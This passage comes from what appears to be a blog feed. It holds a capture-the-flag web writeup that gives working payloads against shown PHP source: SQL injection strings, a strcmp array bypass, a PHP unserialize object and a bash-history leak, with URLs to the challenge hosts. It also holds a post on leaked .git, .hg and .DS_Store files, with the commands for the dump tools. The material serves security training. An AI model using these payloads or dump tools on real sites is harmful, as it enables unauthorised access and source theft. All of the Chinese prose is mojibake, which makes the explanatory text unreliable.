class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>trim()æ˜¯å»é™¤ä¸¤ä¾§ç©ºæ ¼ï¼Œé‡ç‚¹åœ¨äºä¾æ®ä¸‹é¢è¿™å¥è¿›è¡Œæ„é€ </p><p>$sql=â€select user from ctf where (user=â€™â€.$user.â€â€˜) and (pw=â€™â€.$pass.â€â€˜)â€;</p><p>æ„é€ ï¼šadminâ€™)#å³å¯ï¼Œ â€˜)ç”¨æ¥åˆ†åˆ«ç”¨æ¥é—­åˆ #ç”¨æ¥æŠŠåé¢ç»™æ³¨é‡Šæ‰</p><p>nctf{ni_ye_hui_sql?}</p><h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h4><p>æ¥ç»§ç»­å®¡è®¡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass=@$_POST[&apos;pass&apos;];</span><br><span class="line">$pass1=***********;//è¢«éšè—èµ·æ¥çš„å¯†ç </span><br><span class="line">if(isset($pass))</span><br><span class="line">&#123;</span><br><span class="line">if(@!strcmp($pass,$pass1))&#123;</span><br><span class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;the pass is wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;please input pass!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strcmp() å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚ä¾æ®æç¤ºæˆ‘ä»¬éœ€è¦æ„é€ passä¸pass1ç›¸ç­‰æ‰è¡Œï¼Œä½†æ˜¯æˆ‘åˆä¸çŸ¥é“pass1ï¼Œä½†æ˜¯strcmp()æ¯”è¾ƒï¼Œè‹¥ç›¸ç­‰è¿”å›0ï¼ä½†æ˜¯nullå’Œ0æ˜¯ç­‰ä»·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è®©å…¶è¿”å›nullå³å¯ã€‚æ„é€ ï¼špass[]=hack æŠŠè¿™ä¸ªpostä¸Šå»å°±è¡Œ</p><p>flag:nctf{strcmp_is_n0t_3afe}</p><h4 id="èµ·åå­—çœŸéš¾"><a href="#èµ·åå­—çœŸéš¾" class="headerlink" title="èµ·åå­—çœŸéš¾"></a>èµ·åå­—çœŸéš¾</h4><p>å®¡è®¡ï¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">        $one = ord(&apos;1&apos;);//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</span><br><span class="line">        $nine = ord(&apos;9&apos;);</span><br><span class="line">        for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           return $number == &apos;54975581388&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$flag=&apos;*******&apos;;</span><br><span class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</span><br><span class="line">    echo $flag;</span><br><span class="line">else </span><br><span class="line">    echo &apos;access denied&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¦æ±‚ï¼šidä¸­çš„å­—ç¬¦ä¸²ä¸èƒ½æœ‰æ•°å­—ï¼Œè€Œæƒ³å¾—åˆ°flagåˆè¦è¿›å»çš„æ˜¯è¦æ•°å­—</p><p>æ„é€ ï¼š54975581388çš„16è¿›åˆ¶ 0xccccccccc</p><p>æäº¤å¾—åˆ°flag:nctf{follow_your_dream}</p><h4 id="å¯†ç é‡ç½®"><a href="#å¯†ç é‡ç½®" class="headerlink" title="å¯†ç é‡ç½®"></a>å¯†ç é‡ç½®</h4><p>å…¶ä¸­æ¶‰åŠäº†URLç¼–ç å’Œbase64ç¼–ç ï¼ŒburpæŠ“åŒ…ä¿®æ”¹æˆadminå°±è¡Œ</p><p>nctf{reset_password_often_have_vuln}</p><h4 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title=".phpååºåˆ—åŒ–"></a>.phpååºåˆ—åŒ–</h4><p>å®¡è®¡ï¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</span><br><span class="line">    $pass = $_GET[&apos;pass&apos;];</span><br><span class="line"></span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">        if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</span><br><span class="line">        else </span><br><span class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else echo &quot;are you trolling?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„æ„æ€å°±æ˜¯ä¸€ä¸ªåºåˆ—åŒ–è¿‡åçš„å­—ç¬¦ä¸²ä¸ç±»ä¸­çš„å˜é‡å§‹ç»ˆä¿æŒç›¸åŒï¼Œå¯ä»¥æƒ³åˆ°å¼•ç”¨a=&amp;b</p><p>ï¼ˆè¿™å¯ä»¥å½“æˆä¸€ä¸ªä¸“é¢˜è®²è®²ï¼‰</p><p>1.phpçš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line"></span><br><span class="line">class just4fun &#123;  </span><br><span class="line"></span><br><span class="line">    var $enter;  </span><br><span class="line"></span><br><span class="line">    var $secret;  </span><br><span class="line"></span><br><span class="line">    function just4fun()  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        $this-&gt;enter=&amp;$this-&gt;secret;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">echo serialize(new just4fun());  </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ  Desktop php 1.php</span><br><span class="line"></span><br><span class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ ï¼š</p><p><a href="http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}" target="_blank" rel="noopener">http://115.28.150.176/php1/index.php?pass=O:8:â€just4funâ€:2:{s:5:â€enterâ€;N;s:6:â€secretâ€;R:2;}</a></p><p>å¾—åˆ°flag</p><p>nctf{serialize_and_unserialize}</p><h4 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h4><p>å®¡è®¡ï¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">if(get_magic_quotes_gpc())&#123;//å½“ magic_quotes_gpc æ‰“å¼€æ—¶ï¼Œæ‰€æœ‰çš„ â€™ (å•å¼•å·), â€ (åŒå¼•å·),                   \ (åæ–œçº¿) and ç©ºå­—ç¬¦ä¼šè‡ªåŠ¨è½¬ä¸ºå«æœ‰åæ–œçº¿çš„è½¬ä¹‰å­—ç¬¦</span><br><span class="line">$str=stripslashes($str);//ä¸stripslashes()æ­é…ä½¿ç”¨ï¼Œæ­¤å‡½æ•°æ˜¯åˆ é™¤æ‰€æœ‰çš„\çš„ </span><br><span class="line">&#125;</span><br><span class="line">return htmlentities($str, ENT_QUOTES);//htmlentities($str, ENT_QUOTES)æ˜¯æŒ‡ç¼–ç æ‰€æœ‰çš„åŒå¼•å·å’Œå•å¼•å·</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹åœ¨äºï¼š</p><p>åœ¨è¿™é‡Œç”±äºâ€™è¢«è½¬ç¼–ç ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨\è½¬ä¹‰</p><p><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></p><p>æ„é€ ï¼š<code>http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password=%20or%201%23</code></p><p>æ’å…¥åå¤§è‡´çš„sqlè¯­å¥ä¸ºï¼š<code>SELECT * FROM users WHERE name=â€™ admin\â€™ AND pass=â€™ or 1#â€™;</code></p><h4 id="ç»¼åˆé¢˜"><a href="#ç»¼åˆé¢˜" class="headerlink" title="ç»¼åˆé¢˜"></a>ç»¼åˆé¢˜</h4><p>zhä¸ªå¾ˆæœ‰æ„æ€ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªjsfuckï¼Œä¸ç”¨è§£ç ï¼Œç›´æ¥æ‰§è¡Œå°±å¯ä»¥</p><p>æ‰§è¡Œåå¾—åˆ°ï¼š1bc29b36f623ba82aaf6724fd3b16718.php</p><p>æ‰“å¼€å‘ç°ä¸æ˜¯è¿™å›äº‹</p><p>åˆçœ‹æç¤ºï¼Œæƒ³åˆ°bashçš„ä¸€äº›ç›¸å…³ï¼Œå†çœ‹è¿™ä¸ªç½‘é¡µçš„headerå‘ç°tip â€œhistory of bashâ€</p><p>bash_historyæ˜¯ç”¨æ¥å­˜æ”¾å†å²è®°å½•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è®¿é—®</p><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p><p>åˆå¾—åˆ°æç¤ºï¼šzip -r flagbak.zip ./*</p><p>é‚£ä¹ˆå°±è®¿é—®è¿™ä¸ªï¼š</p><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p><p>ä¸‹è½½è§£å‹å¾—åˆ°flag is:nctf{bash_history_means_what}</p><h4 id="æœ‰æºç "><a href="#æœ‰æºç " class="headerlink" title="æœ‰æºç "></a>æœ‰æºç </h4><p>ç»™äº†é¢˜ç›®çš„æºç ï¼Œå¯ä»¥è‡ªå·±æ­å»ºç¯å¢ƒæ¥å°è¯•</p><p><a href="https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB" target="_blank" rel="noopener">https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB</a></p><h4 id="SQLæ³¨å…¥2"><a href="#SQLæ³¨å…¥2" class="headerlink" title="SQLæ³¨å…¥2"></a>SQLæ³¨å…¥2</h4><p>å®¡è®¡ï¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strcasecmpæ˜¯ä¸åˆ†å¤§å°æ¯”è¾ƒï¼Œè¿™æ ·åªè¦å¾—åˆ°å¯†ç md5å€¼ç›¸åŒå³å¯ï¼Œæç¤ºå·²ç»è¯´äº†ç”¨unionæ‰€ä»¥æˆ‘ä»¬æ¥æ„é€ payloadï¼š</p><p>usernameå¡«å†™â€™ union select md5(1)#</p><p>passwordå¡«å†™1</p><p>å¾—flagï¼šntcf{union_select_is_wtf}</p><p>å‰©ä½™çš„é¢˜ç›®ä¸å»ºè®®å°ç™½æ¥åšï¼Œæƒ³åšçš„çœ‹è¿™ä¸ªé“¾æ¥</p><p><a href="http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9" target="_blank" rel="noopener">http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9</a></p><p>æˆ–è€…ï¼š</p><p><a href="https://www.40huo.cn/blog/nctf-writeup.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/nctf-writeup.html</a></p><p>ï¼ˆpsï¼šä¸œè¥¿å¤ªå¤šå†™ä¸åŠ¨äº†ã€‚ã€‚ã€‚ï¼‰</p><p>æ€»ç»“ï¼šå¯ä»¥å†™ç‚¹base64ã€base32ã€urlç¼–ç è§£ç ã€æ–‡æœ¬ä¸16è¿›åˆ¶è½¬æ¢çš„å°å·¥å…·ã€‚&lt;&lt;&lt;å¯ä»¥ç»ƒæ‰‹ï¼Œä½†æ˜¯hackbarå¸¦å…¨äº†å’Œburp</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;æºç åˆ†æ&quot;&gt;&lt;a href=&quot;#æºç åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;æºç åˆ†æ&quot;&gt;&lt;/a&gt;æºç åˆ†æ&lt;/h4&gt;&lt;p&gt;nctf{flag_admiaanaaaaaaaaaaa}&lt;/p&gt;
&lt;h4 id=&quot;phpçš„å¼±ç±»å‹åŠ MD5ç¢°æ’&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>å¸¸è§Webæºç æ³„éœ²æ€»ç»“</title>
    <link href="http://zer0yu.github.io/2017/01/25/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/"/>
    <id>http://zer0yu.github.io/2017/01/25/å¸¸è§Webæºç æ³„éœ²æ€»ç»“/</id>
    <published>2017-01-25T02:50:24.000Z</published>
    <updated>2017-02-04T01:12:53.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>æœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¸¸è§çš„æºç æ³„æ¼é—®é¢˜ï¼Œè¿™äº›ç»å¸¸åœ¨webæ¸—é€æµ‹è¯•ä»¥åŠCTFä¸­å‡ºç°ã€‚</p><h3 id="æºç æ³„æ¼åˆ†ç±»"><a href="#æºç æ³„æ¼åˆ†ç±»" class="headerlink" title="æºç æ³„æ¼åˆ†ç±»"></a>æºç æ³„æ¼åˆ†ç±»</h3><h4 id="hgæºç æ³„æ¼"><a href="#hgæºç æ³„æ¼" class="headerlink" title=".hgæºç æ³„æ¼"></a>.hgæºç æ³„æ¼</h4><h5 id="æ¼æ´æˆå› ï¼š"><a href="#æ¼æ´æˆå› ï¼š" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h5><p>hg initçš„æ—¶å€™ä¼šç”Ÿæˆ.hg</p><p>e.g.<a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p><h5 id="æ¼æ´åˆ©ç”¨ï¼š"><a href="#æ¼æ´åˆ©ç”¨ï¼š" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h5><p>å·¥å…·ï¼š<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure><h4 id="gitæºç æ³„æ¼"><a href="#gitæºç æ³„æ¼" class="headerlink" title=".gitæºç æ³„æ¼"></a>.gitæºç æ³„æ¼</h4><h5 id="æ¼æ´æˆå› ï¼š-1"><a href="#æ¼æ´æˆå› ï¼š-1" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h5><p>åœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚</p><p>e.g. <a href="http://www.example.com/.git/config" target="_blank" rel="noopener">http://www.example.com/.git/config</a></p><h5 id="æ¼æ´åˆ©ç”¨ï¼š-1"><a href="#æ¼æ´åˆ©ç”¨ï¼š-1" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h5><p>å·¥å…·ï¼š</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.example.com/.git/</span><br></pre></td></tr></table></figure><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-git.pl -v -u http://www.example.com/.git/</span><br></pre></td></tr></table></figure><h4 id="DS-Storeæ–‡ä»¶æ³„æ¼"><a href="#DS-Storeæ–‡ä»¶æ³„æ¼" class="headerlink" title=".DS_Storeæ–‡ä»¶æ³„æ¼"></a>.DS_Storeæ–‡ä»¶æ³„æ¼</h4><h5 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› :"></a>æ¼æ´æˆå› :</h5><p>åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_storeï¼Œè¢«å‘ç°åï¼Œè·å–äº†æ•æ„Ÿçš„æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚</p><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨:"></a>æ¼æ´åˆ©ç”¨:</h5><p><a href="http://www.example.com/.ds_store" target="_blank" rel="noopener">http://www.example.com/.ds_store</a></p><p>æ³¨æ„è·¯å¾„æ£€æŸ¥</p><p>ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶</p><p>åœ¨ç½‘ç«™çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€éœ€è¦å¯¹ç½‘ç«™ä¸­çš„æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€å‡çº§ã€‚æ­¤æ—¶å°±éœ€è¦å¯¹ç½‘ç«™æ•´ç«™æˆ–è€…å…¶ä¸­æŸä¸€é¡µé¢è¿›è¡Œå¤‡ä»½ã€‚å½“å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¿®æ”¹è¿‡ç¨‹ä¸­çš„ç¼“å­˜æ–‡ä»¶å› ä¸ºå„ç§åŸå› è€Œè¢«ç•™åœ¨ç½‘ç«™webç›®å½•ä¸‹ï¼Œè€Œè¯¥ç›®å½•åˆæ²¡æœ‰è®¾ç½®è®¿é—®æƒé™æ—¶ï¼Œä¾¿æœ‰å¯èƒ½å¯¼è‡´å¤‡ä»½æ–‡ä»¶æˆ–è€…ç¼–è¾‘å™¨çš„ç¼“å­˜æ–‡ä»¶è¢«ä¸‹è½½ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç»™æœåŠ¡å™¨çš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚</p><p>å·¥å…·ï¼š</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><h5 id="æ¼æ´æˆå› åŠå±å®³"><a href="#æ¼æ´æˆå› åŠå±å®³" class="headerlink" title="æ¼æ´æˆå› åŠå±å®³:"></a>æ¼æ´æˆå› åŠå±å®³:</h5><p>è¯¥æ¼æ´çš„æˆå› ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š</p><ol><li>æœåŠ¡å™¨ç®¡ç†å‘˜é”™è¯¯åœ°å°†ç½‘ç«™æˆ–è€…ç½‘é¡µçš„å¤‡ä»½æ–‡ä»¶æ”¾ç½®åˆ°æœåŠ¡å™¨webç›®å½•ä¸‹ã€‚</li><li>ç¼–è¾‘å™¨åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è‡ªåŠ¨ä¿å­˜çš„å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¸´æ—¶æ–‡ä»¶å› ä¸ºå„ç§åŸå› æ²¡æœ‰è¢«åˆ é™¤è€Œä¿å­˜åœ¨webç›®å½•ä¸‹ã€‚</li></ol><h5 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h5><p>è¯¥æ¼æ´å¾€å¾€ä¼šå¯¼è‡´æœåŠ¡å™¨æ•´ç«™æºä»£ç æˆ–è€…éƒ¨åˆ†é¡µé¢çš„æºä»£ç è¢«ä¸‹è½½ï¼Œåˆ©ç”¨ã€‚æºä»£ç ä¸­æ‰€åŒ…å«çš„å„ç±»æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æœåŠ¡å™¨æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼ŒæœåŠ¡å™¨é…ç½®ä¿¡æ¯ç­‰ä¼šå› æ­¤è€Œæ³„éœ²ï¼Œé€ æˆå·¨å¤§çš„æŸå¤±ã€‚è¢«æ³„éœ²çš„æºä»£ç è¿˜å¯èƒ½ä¼šè¢«ç”¨äºä»£ç å®¡è®¡ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨è€Œå¯¹æ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line"></span><br><span class="line">.zip</span><br><span class="line"></span><br><span class="line">.7z</span><br><span class="line"></span><br><span class="line">.tar.gz</span><br><span class="line"></span><br><span class="line">.bak</span><br><span class="line"></span><br><span class="line">.swp</span><br><span class="line"></span><br><span class="line">.txt</span><br><span class="line"></span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h5 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name <span class="string">".DS_Store"</span> -print0 | xargs -0 rm -rf <span class="comment">#é€’å½’åˆ é™¤".DS_Store"æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h4 id="SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²"><a href="#SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²" class="headerlink" 